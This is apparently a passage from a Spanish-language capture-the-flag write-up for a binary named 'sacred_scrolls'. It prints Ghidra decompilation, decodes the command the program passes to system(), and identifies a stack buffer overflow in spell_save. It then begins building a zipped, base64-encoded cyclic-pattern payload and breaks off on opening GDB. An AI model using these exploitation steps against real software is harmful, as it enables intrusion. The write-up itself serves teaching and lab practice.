+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> cVar1;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> lVar2;</span>
+<span class="mtk1">  ulong uVar3;</span>
+<span class="mtk1">  undefined8 </span><span class="mtk5">*</span><span class="mtk1">puVar4;</span>
+<span class="mtk1">  undefined4 </span><span class="mtk5">*</span><span class="mtk1">puVar5;</span>
+<span class="mtk1">  byte bVar6;</span>
+<span class="mtk1">  undefined auStack_1230[</span><span class="mtk6">8</span><span class="mtk1">];</span>
+<span class="mtk1">  undefined local_1228[</span><span class="mtk6">15</span><span class="mtk1">];</span>
+<span class="mtk1">  undefined8 uStack_1219;</span>
+<span class="mtk1">  undefined2 auStack_1211[</span><span class="mtk6">2036</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> cStack_229;</span>
+<span class="mtk1">  undefined8 local_228[</span><span class="mtk6">65</span><span class="mtk1">];</span>
+<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
+<span class="mtk1">  ulong local_18;</span>
+<span class="mtk1">  ulong local_10;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  bVar6 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  puVar4 </span><span class="mtk5">=</span><span class="mtk1"> local_228;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (lVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">; lVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; lVar2 </span><span class="mtk5">=</span><span class="mtk1"> lVar2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">puVar4 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    puVar4 </span><span class="mtk5">=</span><span class="mtk1"> puVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  puVar4 </span><span class="mtk5">=</span><span class="mtk1"> (undefined8 </span><span class="mtk5">*</span><span class="mtk1">) local_1228;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (lVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">200</span><span class="mtk1">; lVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; lVar2 </span><span class="mtk5">=</span><span class="mtk1"> lVar2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">puVar4 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    puVar4 </span><span class="mtk5">=</span><span class="mtk1"> puVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400aa5</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[*] Enter file (it will be named spell.zip): "</span><span class="mtk1">);</span>
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400abe</span><span class="mtk1">;</span>
+<span class="mtk1">  local_18 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, local_228, </span><span class="mtk5">0x</span><span class="mtk6">1ff</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> (local_18 </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (local_10 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; local_10 </span><span class="mtk5">&lt;</span><span class="mtk1"> local_18; local_10 </span><span class="mtk5">=</span><span class="mtk1"> local_10 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (((((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">'a'</span><span class="mtk1">) </span><span class="mtk5">||</span>
+<span class="mtk1">          (</span><span class="mtk4">'z'</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10))) </span><span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">         ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">||</span>
+<span class="mtk1">          (</span><span class="mtk4">'Z'</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10))))) </span><span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">        ((((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">'0'</span><span class="mtk1"> </span><span class="mtk5">||</span>
+<span class="mtk1">          (</span><span class="mtk4">'9'</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10))) </span><span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">         (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'.'</span><span class="mtk1">)) </span><span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">       ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span> <span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">        (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'+'</span>)))))) <span class="mtk5">&amp;&amp;</span>
+<span class="mtk1">     (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'='</span><span class="mtk1">)) {</span>
+
+<span class="mtk1">      auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined  [</span><span class="mtk6">8</span><span class="mtk1">])</span><span class="mtk5">0x</span><span class="mtk6">400bea</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n%s</span><span class="mtk4">[-] File contains invalid charcter: [</span><span class="mtk6">%c</span><span class="mtk4">]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0040127f, (ulong) (</span><span class="mtk7 mtki">uint</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_228 </span><span class="mtk5">+</span><span class="mtk1"> local_10));</span>  
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">      auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined  [</span><span class="mtk6">8</span><span class="mtk1">])</span><span class="mtk5">0x</span><span class="mtk6">400bf4</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  local_1228._0_4_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">6f686365</span><span class="mtk1">;</span>
+<span class="mtk1">  local_1228._4_2_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2720</span><span class="mtk1">;</span>
+<span class="mtk1">  local_1228[</span><span class="mtk6">6</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400c32</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">strcat</span><span class="mtk1">(local_1228, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) local_228);</span>
+<span class="mtk1">  uVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">ffffffffffffffff</span><span class="mtk1">;</span>
+<span class="mtk1">  puVar5 </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) local_1228;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (uVar3 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    uVar3 </span><span class="mtk5">=</span><span class="mtk1"> uVar3 </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    cVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) puVar5;</span>
+<span class="mtk1">    puVar5 </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) puVar5 </span><span class="mtk5">+</span><span class="mtk1"> (ulong)bVar6 </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (cVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">);</span>
+
+<span class="mtk1">  uVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">~</span><span class="mtk1">uVar3;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (auStack_1230 </span><span class="mtk5">+</span><span class="mtk1"> uVar3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">7</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">65736162207c2027</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) local_1228 </span><span class="mtk5">+</span><span class="mtk1"> uVar3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">7</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">203e20642d203436</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) auStack_1211 </span><span class="mtk5">+</span><span class="mtk1"> (uVar3 </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">697a2e6c6c657073</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined2 </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) auStack_1211 </span><span class="mtk5">+</span><span class="mtk1"> uVar3) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">70</span><span class="mtk1">;</span>
+
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400c9f</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">system</span><span class="mtk1">(local_1228);</span>
+
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400cb2</span><span class="mtk1">;</span>
+<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"spell.zip"</span><span class="mtk1">, </span><span class="mtk4">"rb"</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400cd5</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[-] There is no such file!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0040127f);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400cdf</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-0x</span><span class="mtk6">45</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400cfe</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[+] Spell has been added!</span><span class="mtk6">\n%s</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00401202, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_004011fa);</span>
+<span class="mtk1">  auStack_1230 </span><span class="mtk5">=</span><span class="mtk1"> (undefined[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">400d09</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">close</span><span class="mtk1">((</span><span class="mtk7 mtki">int</span><span class="mtk1">) fp);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí podemos ver algunos números hexadecimales que en realidad son bytes imprimibles que forman un comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from pwn import p8, p16, p32, p64
+&gt;&gt;&gt; p32(0x6f686365) + p16(0x2720)
+b"echo '"
+&gt;&gt;&gt; p64(0x65736162207c2027) + p64(0x203e20642d203436) + p64(0x697a2e6c6c657073) + p8(0x70)  
+b"' | base64 -d &gt; spell.zip"
+</code></pre></div><p>Por lo tanto, podemos intuir que debemos cargar un archivo ZIP codificado en Base64, y se decodificará y guardará como <code>spell.zip</code>. Una cosa importante es que ya tenemos <code>system</code> cargado en el binario.</p><h3 id="opción-para-leer-archivos">Opción para leer archivos</h3><p>Las segundas opciones (leer o lanzar) usan la función <code>spell_read</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk8">spell_read</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data;</span>
+<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
+
+<span class="mtk1">  data </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"unzip spell.zip"</span><span class="mtk1">);</span>
+<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"spell.txt"</span><span class="mtk1">, </span><span class="mtk4">"rb"</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[-] There is no such file!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0040127f);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-0x</span><span class="mtk6">45</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">fread</span><span class="mtk1">(data, </span><span class="mtk6">399</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, fp);</span>
+<span class="mtk1">  ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strncmp</span><span class="mtk1">(data, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00401322, </span><span class="mtk6">4</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strncmp</span><span class="mtk1">(data </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00401327, </span><span class="mtk6">3</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">close</span><span class="mtk1">((</span><span class="mtk7 mtki">int</span><span class="mtk1">) fp);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> data;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[-] Your file does not have the signature of the b</span><span class="mtk4">oy who lived!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0040127f);</span>  
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta se ve más simple. Básicamente, descomprime el archivo <code>spell.zip</code> usando <code>unzip</code>, luego lee el contenido de <code>spell.txt</code> (que se supone que está dentro del archivo ZIP) y devuelve el contenido si se cumplen algunas condiciones.</p><p>En Ghidra, descubrimos qué valores se almacenan en <code>DAT_00401322</code> y <code>DAT_00401327</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">                     DAT_00401322                                    XREF[1]:     spell_read:00400d97(*)  
+00401322 f0              ??         F0h
+00401323 9f              ??         9Fh
+00401324 91              ??         91h
+00401325 93              ??         93h
+00401326 00              ??         00h
+                     DAT_00401327                                    XREF[1]:     spell_read:00400db7(*)
+00401327 e2              ??         E2h
+00401328 9a              ??         9Ah
+00401329 a1              ??         A1h
+0040132a 00              ??         00h
+</code></pre></div><p>Los primeros 4 bytes de <code>spell.txt</code> tienen que ser <code>"\xf0\x9f\x91\x93"</code> y los siguientes 3 bytes tienen que ser <code>"\xe2\x9a\xa1"</code>. Estos valores son <em>emoji</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; b"\xf0\x9f\x91\x93"
+b'\xf0\x9f\x91\x93'
+&gt;&gt;&gt; b"\xf0\x9f\x91\x93".decode()  
+'👓'
+&gt;&gt;&gt; b"\xe2\x9a\xa1".decode()
+'⚡'
+</code></pre></div><h3 id="opción-para-guardar-archivo">Opción para guardar archivo</h3><p>Esta opción es controlada por <code>spell_save</code>, y saldrá del programa después de ser llamada (ver <code>main</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">spell_save</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
+<span class="mtk1">  undefined local_28[</span><span class="mtk6">32</span><span class="mtk1">];</span>
+
+<span class="mtk1">  </span><span class="mtk8">memcpy</span><span class="mtk1">(local_28, param_1, </span><span class="mtk6">600</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">[-] This spell is not quiet effective, thus it wil</span><span class="mtk4">l not be saved!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0040127f);</span>  
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><h3 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h3><p>Aquí tenemos una vulnerabilidad clara de <em>Buffer Overflow</em> porque <code>local_28</code> es una cadena de caracteres de 32 bytes, pero los programa copia hasta 600 bytes de <code>param_1</code>. Por lo tanto, podemos escribir fuera de la cadena <code>local_28</code> y modificar los valores existentes en la pila que el programa utiliza para controlar el flujo de ejecución. Por ejemplo, cuando el programa llama <code>spell_save</code> desde <code>main</code>, almacena la dirección de retorno a <code>main</code> en la pila para que pueda extraerse antes de retornar de <code>spell_save</code>.</p><p>Obsérvese que <code>param_1</code> es <code>target</code> en <code>main</code>, que es el valor de retorno de <code>spell_read</code>. Por lo tanto, explotaremos la vulnerabilidad de <em>Buffer Overflow</em> con un fichero <code>spell.txt</code> comprimido en un archivo ZIP.</p><p>Otra forma de descubrir cómo controlar <code>param_1</code> es probando en GDB. Primero, creamos el archivo usando como <em>payload</em> con una patrón para que podamos usarlo más adelante:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -ne <span class="code-dark-yellow">"\xf0\x9f\x91\x93\xe2\x9a\xa1</span><span class="code-dark-magenta">$(</span><span class="code-dark-green">pwn</span> cyclic 100<span class="code-dark-magenta">)</span><span class="code-dark-yellow">"</span> &gt; spell.txt
+
+<span class="code-cyan">$</span> <span class="code-dark-green">zip</span> spell.zip <span class="mtku">spell.txt</span>
+  adding: spell.txt (deflated 47%)
+
+<span class="code-cyan">$</span> <span class="code-dark-green">base64</span> -w0 <span class="mtku">spell.zip</span>
+UEsDBBQAAAAIAJWlhVU4LwDzOQAAAGsAAAAJABwAc3BlbGwudHh0VVQJAAMqSo5jKkqOY3V4CwABBOgDAAAE6AMAAA3DRw2EAAAAMK3szbGHDMKPD8EaCk4CbdL/fZzv9QSERsYmpmbmFpZW1ja2/uzsHRydnF1c3dz9AFBLAQIeAxQAAAAIAJWlhVU4LwDzOQAAAGsAAAAJABgAAAAAAAEAAAC0gQAAAABzcGVsbC50eHRVVAUAAypKjmN1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBPAAAAfAAAAAAA  
+</code></pre></div><p>Ahora arrancamos el programa en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sacred_scrolls</span>
